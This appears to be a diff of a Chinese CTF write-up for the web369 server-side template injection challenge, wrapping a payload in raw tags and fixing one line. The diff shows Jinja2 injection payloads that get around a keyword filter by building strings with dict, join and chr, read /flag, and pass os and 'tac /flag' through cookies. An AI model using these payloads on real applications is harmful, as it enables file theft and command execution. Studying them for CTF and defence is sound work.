@@ -365,6 +365,8 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 ```
 
+{% raw %}
+
 ### [web369]过滤''、""、[、args、_、os、{{、request
 
 抄了以下payload：
@@ -373,7 +375,7 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 
 ```
 ?name=
-{% set po=dict(po=1,p=2)|join百分号}
+{% set po=dict(po=1,p=2)|join}
 {% set a=(()|select|string|list)|attr(po)(24)%}
 {% set re=dict(reque=1,st=1)|join%}
 {% set in=(a~a~dict(init=a)|join~a~a)|join()%}
@@ -385,6 +387,8 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 {% set f=chr(47)~(dict(flag=a)|join)%}
 {% print(x.open(f).read())%}
 ```
+
+{% endraw %}
 
 详解：
 
